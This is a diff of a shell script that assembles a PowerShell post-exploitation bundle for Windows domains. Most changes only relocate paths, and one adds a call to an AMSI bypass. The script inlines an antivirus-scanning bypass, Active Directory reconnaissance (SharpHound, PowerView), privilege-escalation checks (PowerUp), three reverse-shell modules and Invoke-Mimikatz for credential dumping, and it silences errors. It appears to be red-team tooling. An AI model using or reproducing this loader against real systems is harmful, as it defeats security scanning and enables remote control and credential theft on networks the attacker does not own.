@@ -88,7 +88,7 @@ if [[ -n $(command -v git) ]] && [[ -n $update ]]; then
 fi
 
 # Save some variables for convenience
-admodule_dll="ADModule/Microsoft.ActiveDirectory.Management.dll"
+admodule_dll="tools/ADModule/Microsoft.ActiveDirectory.Management.dll"
 cwd="\$ExecutionContext.SessionState.Path.CurrentLocation"
 hide="-ErrorAction SilentlyContinue -WarningAction SilentlyContinue"
 languagemode="\$ExecutionContext.SessionState.LanguageMode"
@@ -146,7 +146,8 @@ if (\$isAdmin) {
 }
 
 # AMSI bypass
-$(cat amsi_bypass.ps1)
+$(cat scripts/Deploy-AMSIBypass.ps1)
+Deploy-AMSIBypass
 if (\$?) {
     echo "Bypassed AMSI"
 } else {
@@ -154,7 +155,7 @@ if (\$?) {
 }
 
 # BloodHound
-$(cat BloodHound/Ingestors/SharpHound.ps1)
+$(cat tools/BloodHound/Ingestors/SharpHound.ps1)
 if (\$?) {
     echo "Imported BloodHound"
 } else {
@@ -162,13 +163,13 @@ if (\$?) {
 }
 
 # PowerView and PowerUp
-$(cat PowerSploit/Recon/PowerView.ps1)
+$(cat tools/PowerSploit/Recon/PowerView.ps1)
 if (\$?) {
     echo "Imported PowerView"
 } else {
     echo "Failed to import PowerView"
 }
-$(cat PowerSploit/Privesc/PowerUp.ps1)
+$(cat tools/PowerSploit/Privesc/PowerUp.ps1)
 if (\$?) {
     echo "Imported PowerUp"
 } else {
@@ -176,19 +177,19 @@ if (\$?) {
 }
 
 # Reverse shell goodies
-$(cat ConPtyShell/Invoke-ConPtyShell.ps1)
+$(cat tools/ConPtyShell/Invoke-ConPtyShell.ps1)
 if (\$?) {
     echo "Imported ConPtyShell"
 } else {
     echo "Failed to import ConPtyShell"
 }
-$(cat nishang/Shells/Invoke-PowerShellTcp.ps1)
+$(cat tools/nishang/Shells/Invoke-PowerShellTcp.ps1)
 if (\$?) {
     echo "Imported PowerShellTcp"
 } else {
     echo "Failed to import PowerShellTcp"
 }
-$(cat powercat/powercat.ps1)
+$(cat tools/powercat/powercat.ps1)
 if (\$?) {
     echo "Imported PowerCat"
 } else {
@@ -196,7 +197,7 @@ if (\$?) {
 }
 
 # Mimikatz
-$(cat PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
+$(cat tools/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
 if (\$?) {
     echo "Imported Mimikatz"
 } else {
